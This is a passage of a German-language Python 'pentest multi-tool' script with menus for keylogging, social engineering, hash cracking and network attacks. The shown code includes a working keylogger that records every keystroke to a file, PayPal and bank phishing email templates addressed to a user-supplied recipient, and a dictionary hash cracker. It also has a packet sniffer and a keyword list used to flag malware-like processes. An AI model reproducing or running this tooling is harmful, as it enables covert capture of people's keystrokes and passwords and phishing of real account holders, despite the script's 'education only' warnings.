    self.get_input("\n⏎ Enter zum Fortfahren...")

# ==================== KEYLOGGER MODUL ====================
def keylogger_menu(self):
    """Keylogger Modul Menü"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("🔑 KEYLOGGER MODUL")
        print("=" * 60)
        print("Status: " + ("✅ AKTIV" if self.is_keylogging else "❌ INAKTIV"))
        if self.is_keylogging:
            print(f"Erfasst: {self.keystroke_count} Tastenanschläge")
            print(f"Laufzeit: {datetime.now() - self.start_time}")
        print("=" * 60)
        print("1 - Keylogger starten")
        print("2 - Keylogger stoppen")
        print("3 - Logs anzeigen")
        print("4 - Logs löschen")
        print("5 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.start_keylogger()
        elif choice == "2":
            self.stop_keylogger()
        elif choice == "3":
            self.show_keylogs()
        elif choice == "4":
            self.clear_keylogs()
        elif choice == "5":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def start_keylogger(self):
    """Startet den Keylogger"""
    if self.is_keylogging:
        print("⚠️ Keylogger läuft bereits")
        return
    
    print("🔑 Starte Keylogger...")
    self.is_keylogging = True
    self.start_time = datetime.now()
    self.keystroke_count = 0
    
    # Starte Keylogger in separatem Thread
    self.keylogger_thread = threading.Thread(target=self.keylogger_callback, daemon=True)
    self.keylogger_thread.start()
    print("✅ Keylogger gestartet")

def stop_keylogger(self):
    """Stoppt den Keylogger"""
    if not self.is_keylogging:
        print("⚠️ Keylogger ist nicht aktiv")
        return
    
    self.is_keylogging = False
    print("✅ Keylogger gestoppt")
    print(f"📊 Gesamte Tastenanschläge: {self.keystroke_count}")

def keylogger_callback(self):
    """Keylogger Callback-Funktion"""
    try:
        with open(self.keylog_file, 'a', encoding='utf-8') as f:
            f.write(f"\n=== Keylogger gestartet um {datetime.now()} ===\n")
            
        def on_key_event(event):
            if self.is_keylogging:
                self.keystroke_count += 1
                key = event.name
                if len(key) > 1:
                    key = f"[{key.upper()}]"
                
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_entry = f"{timestamp} - {key}\n"
                
                try:
                    with open(self.keylog_file, 'a', encoding='utf-8') as f:
                        f.write(log_entry)
                except Exception as e:
                    logger.error(f"Keylog write error: {e}")
        
        keyboard.on_press(on_key_event)
        
        # Warte bis Keylogger gestoppt wird
        while self.is_keylogging:
            time.sleep(0.1)
            
    except Exception as e:
        logger.error(f"Keylogger error: {e}")

def show_keylogs(self):
    """Zeigt die Keylogger Logs an"""
    try:
        if os.path.exists(self.keylog_file):
            with open(self.keylog_file, 'r', encoding='utf-8') as f:
                content = f.read()
                if content:
                    print("📄 Keylogger Logs:")
                    print(content[-1000:])  # Zeige nur die letzten 1000 Zeichen
                else:
                    print("❌ Keine Logs vorhanden")
        else:
            print("❌ Keine Log-Datei gefunden")
    except Exception as e:
        print(f"❌ Fehler beim Lesen der Logs: {e}")

def clear_keylogs(self):
    """Löscht die Keylogger Logs"""
    if os.path.exists(self.keylog_file):
        os.remove(self.keylog_file)
        print("✅ Logs gelöscht")
    else:
        print("❌ Keine Log-Datei gefunden")

# ==================== SYSTEM SCAN MODUL ====================
def system_scan_menu(self):
    """System Scan Modul Menü"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("🔍 SYSTEM SCAN MODUL")
        print("=" * 60)
        print("1 - Vollständiger System Scan")
        print("2 - Prozess-Analyse")
        print("3 - Netzwerkverbindungen")
        print("4 - Autostart-Programme")
        print("5 - Installierte Software")
        print("6 - Systeminformationen")
        print("7 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.full_system_scan()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "2":
            self.process_analysis()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "3":
            self.network_connections()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "4":
            self.autostart_programs()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "5":
            self.installed_software()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "6":
            self.system_information()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "7":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def full_system_scan(self):
    """Führt einen vollständigen System-Scan durch"""
    print("🔍 Starte vollständigen System-Scan...")
    
    scan_results = {
        'timestamp': datetime.now().isoformat(),
        'system_info': self.get_system_info(),
        'processes': self.get_process_list(),
        'network_connections': self.get_network_connections(),
        'autostart': self.get_autostart_programs(),
        'installed_software': self.get_installed_software(),
        'suspicious_items': []
    }
    
    # Scanne nach verdächtigen Prozessen
    suspicious_processes = self.scan_suspicious_processes(scan_results['processes'])
    scan_results['suspicious_items'].extend(suspicious_processes)
    
    # Scanne nach verdächtigen Netzwerkverbindungen
    suspicious_connections = self.scan_suspicious_connections(scan_results['network_connections'])
    scan_results['suspicious_items'].extend(suspicious_connections)
    
    # Speichere Ergebnisse
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    report_file = os.path.join(self.report_dir, f"system_scan_{timestamp}.json")
    
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(scan_results, f, indent=4, ensure_ascii=False)
    
    print(f"✅ System-Scan abgeschlossen. Ergebnisse: {report_file}")
    
    # Zeige Zusammenfassung
    print(f"📊 Gefunden: {len(suspicious_processes)} verdächtige Prozesse")
    print(f"📊 Gefunden: {len(suspicious_connections)} verdächtige Verbindungen")

def get_system_info(self):
    """Sammelt Systeminformationen"""
    system_info = {
        'platform': platform.platform(),
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'architecture': platform.architecture(),
        'processor': platform.processor(),
        'hostname': socket.gethostname(),
        'ip_address': socket.gethostbyname(socket.gethostname())
    }
    return system_info

def get_process_list(self):
    """Ermittelt laufende Prozesse"""
    processes = []
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output(['tasklist', '/fo', 'csv'], text=True)
            lines = output.strip().split('\n')[1:]
            for line in lines:
                parts = line.split('","')
                if len(parts) >= 5:
                    processes.append({
                        'name': parts[0].replace('"', ''),
                        'pid': parts[1].replace('"', ''),
                        'memory': parts[4].replace('"', '')
                    })
        else:
            output = subprocess.check_output(['ps', 'aux'], text=True)
            lines = output.strip().split('\n')[1:]
            for line in lines:
                parts = line.split()
                if len(parts) >= 11:
                    processes.append({
                        'user': parts[0],
                        'pid': parts[1],
                        'cpu': parts[2],
                        'memory': parts[3],
                        'command': ' '.join(parts[10:])
                    })
    except Exception as e:
        logger.error(f"Process list error: {e}")
    
    return processes

def scan_suspicious_processes(self, processes):
    """Scannt nach verdächtigen Prozessen"""
    suspicious_keywords = [
        'keylogger', 'rat', 'trojan', 'backdoor', 'miner', 'crypto',
        'hack', 'exploit', 'inject', 'spy', 'stealer', 'malware'
    ]
    
    suspicious = []
    for process in processes:
        process_name = process.get('name', '').lower() if isinstance(process, dict) else str(process).lower()
        for keyword in suspicious_keywords:
            if keyword in process_name:
                suspicious.append({
                    'type': 'suspicious_process',
                    'process': process,
                    'reason': f'Contains keyword: {keyword}'
                })
                break
    
    return suspicious

# ==================== SOCIAL ENGINEERING MODUL ====================
def social_engineering_menu(self):
    """Social Engineering Modul Menü"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("🎭 SOCIAL ENGINEERING MODUL")
        print("=" * 60)
        print("⚠️  WARNUNG: Nur für legale Bildungszwecke verwenden!")
        print("=" * 60)
        print("1 - Phishing Email Generator")
        print("2 - Fake Login Page")
        print("3 - Credential Harvester")
        print("4 - USB Drop Attack Simulator")
        print("5 - Social Engineering Toolkit")
        print("6 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.phishing_email_generator()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "2":
            self.fake_login_page()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "3":
            self.credential_harvester()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "4":
            self.usb_drop_attack()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "5":
            self.social_engineering_toolkit()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "6":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def phishing_email_generator(self):
    """Generiert Phishing Emails für Bildungszwecke"""
    print("📧 Phishing Email Generator (Nur für Bildungszwecke!)")
    
    email_type = self.get_input("Email-Typ (paypal/bank/facebook/google): ")
    recipient = self.get_input("Empfänger Email: ")
    sender_name = self.get_input("Absender Name: ")
    
    templates = {
        'paypal': {
            'subject': 'Wichtige Sicherheitsmitteilung zu Ihrem PayPal-Konto',
            'body': """Sehr geehrter PayPal-Nutzer,

wir haben ungewöhnliche Aktivitäten in Ihrem Konto festgestellt. 
Um die Sicherheit Ihres Kontos zu gewährleisten, müssen Sie sich 
über den folgenden Link verifizieren:

[Fake-Link]

Bitte handeln Sie innerhalb der nächsten 24 Stunden, um eine 
Sperrung Ihres Kontos zu vermeiden.

Mit freundlichen Grüßen,
PayPal Sicherheitsteam"""
        },
        'bank': {
            'subject': 'Dringende Sicherheitsüberprüfung erforderlich',
            'body': """Sehr geehrter Kunde,

unsere Sicherheitssysteme haben eine ungewöhnliche Anmeldeaktivität 
in Ihrem Online-Banking-Konto erkannt.

Bitte bestätigen Sie Ihre Identität unter:
[Fake-Link]

Ihre Bank"""
        }
    }
    
    template = templates.get(email_type, templates['paypal'])
    
    print(f"\n📧 Email-Vorschau:")
    print(f"Von: {sender_name}")
    print(f"An: {recipient}")
    print(f"Betreff: {template['subject']}")
    print(f"\n{template['body']}")
    
    print("\n⚠️  Diese Funktion dient nur zu Bildungszwecken!")
    print("⚠️  Phishing ist illegal ohne ausdrückliche Erlaubnis!")

# ==================== HASH & CRACKING MODUL ====================
def hash_cracking_menu(self):
    """Hash Cracking Modul Menü"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("🔓 HASH & CRACKING MODUL")
        print("=" * 60)
        print("1 - Hash-Erkennung")
        print("2 - Dictionary Attack")
        print("3 - Brute-Force Attack")
        print("4 - Rainbow Table Attack")
        print("5 - Hash-Generator")
        print("6 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.hash_identification()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "2":
            self.dictionary_attack()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "3":
            self.brute_force_attack()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "4":
            self.rainbow_table_attack()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "5":
            self.hash_generator()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "6":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def hash_identification(self):
    """Erkennt Hash-Typen"""
    hash_input = self.get_input("Geben Sie den Hash ein: ")
    
    hash_types = {
        '32 chars (hex)': 'MD5',
        '40 chars (hex)': 'SHA-1',
        '64 chars (hex)': 'SHA-256',
        '56 chars (hex)': 'SHA-224',
        '96 chars (hex)': 'SHA-384',
        '128 chars (hex)': 'SHA-512',
        '34 chars (starts with $1$)': 'MD5 Crypt',
        '34 chars (starts with $2a$)': 'Blowfish',
        '60 chars (starts with $2y$)': 'BCrypt',
        'starts with $5$': 'SHA-256 Crypt',
        'starts with $6$': 'SHA-512 Crypt'
    }
    
    print(f"🔍 Analysiere Hash: {hash_input}")
    print(f"📏 Länge: {len(hash_input)} Zeichen")
    
    for pattern, hash_type in hash_types.items():
        if pattern in hash_input or (pattern.startswith('starts with') and hash_input.startswith(pattern.split()[-1])):
            print(f"✅ Möglicher Hash-Typ: {hash_type}")
            return
    
    print("❌ Hash-Typ konnte nicht erkannt werden")

def dictionary_attack(self):
    """Führt einen Dictionary-Angriff durch"""
    hash_to_crack = self.get_input("Geben Sie den Hash ein: ")
    wordlist_path = self.get_input("Pfad zur Wordlist (Enter für Standard): ")
    
    if not wordlist_path:
        # Erstelle eine kleine Standard-Wordlist
        wordlist_path = os.path.join(self.wordlists_dir, "common_passwords.txt")
        if not os.path.exists(wordlist_path):
            common_passwords = [
                'password', '123456', 'qwerty', 'admin', 'welcome',
                'password123', 'letmein', 'monkey', 'sunshine', 'password1'
            ]
            with open(wordlist_path, 'w') as f:
                f.write('\n'.join(common_passwords))
    
    if not os.path.exists(wordlist_path):
        print("❌ Wordlist nicht gefunden")
        return
    
    print(f"🔓 Starte Dictionary-Angriff mit {wordlist_path}...")
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                # Teste verschiedene Hash-Methoden
                for algo in ['md5', 'sha1', 'sha256']:
                    hashed = hashlib.new(algo, password.encode()).hexdigest()
                    if hashed == hash_to_crack:
                        print(f"✅ Password gefunden: {password}")
                        print(f"🔑 Hash-Algorithmus: {algo.upper()}")
                        return
        
        print("❌ Password nicht in Wordlist gefunden")
        
    except Exception as e:
        print(f"❌ Fehler beim Dictionary-Angriff: {e}")

# ==================== ADVANCED TOOLS MODUL ====================
def advanced_tools_menu(self):
    """Advanced Tools Modul Menü"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("⚡ ADVANCED TOOLS MODUL")
        print("=" * 60)
        print("1 - Packet Sniffer")
        print("2 - ARP Spoofer")
        print("3 - DNS Spoofer")
        print("4 - WiFi Scanner")
        print("5 - Vulnerability Scanner")
        print("6 - Exploit Framework")
        print("7 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.packet_sniffer()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "2":
            self.arp_spoofer()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "3":
            self.dns_spoofer()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "4":
            self.wifi_scanner()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "5":
            self.vulnerability_scanner()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "6":
            self.exploit_framework()
            self.get_input("⏎ Enter zum Fortfahren...")
        elif choice == "7":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def packet_sniffer(self):
    """Einfacher Packet Sniffer"""
    print("📡 Packet Sniffer")
    print("⚠️  Benötigt Administratorrechte!")
    
    try:
        interface = self.get_input("Netzwerk-Interface (Enter für Standard): ") or None
        count = int(self.get_input("Anzahl Packets (0 für unendlich): ") or "0")
        
        print(f"🔍 Starte Packet Sniffer auf {interface or 'default interface'}...")
        print("⏹️  Drücke Ctrl+C zum Stoppen")
        
        # Einfacher Packet Sniffer mit Scapy
        scapy.sniff(iface=interface, count=count, prn=lambda x: x.summary())
        
    except PermissionError:
        print("❌ Administratorrechte benötigt!")
    except Exception as e:
        print(f"❌ Fehler beim Packet Sniffer: {e}")

def wifi_scanner(self):
    """WiFi Netzwerk Scanner"""
    print("📶 WiFi Scanner")
    
    if platform.system() != "Windows":
        print("📋 Verfügbare Netzwerke:")
        try:
            if platform.system() == "Linux":
                # Linux WiFi Scan
                result = subprocess.run(['nmcli', '-f', 'SSID,SIGNAL', 'dev', 'wifi'], 
                                      capture_output=True, text=True)
                print(result.stdout)
            elif platform.system() == "Darwin":  # macOS
                result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], 
                                      capture_output=True, text=True)
                print(result.stdout)
        except Exception as e:
            print(f"❌ WiFi Scan nicht verfügbar: {e}")
    else:
        print("❌ WiFi Scanner für Windows noch nicht implementiert")

# ==================== HAUPTFUNKTION ====================
def main():
    """Hauptfunktion des Programms"""
    try:
        show_banner()
        tool = PenTestMultiToolProUltimate()
        tool.show_main_menu()
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Programm durch Benutzer abgebrochen")
    except Exception as e:
        print(f"�️  Kritischer Fehler: {e}")
        logger.error(f"Critical error: {e}", exc_info=True)
    finally:
        print("👋 Programm beendet")

if __name__ == "__main__":
    main()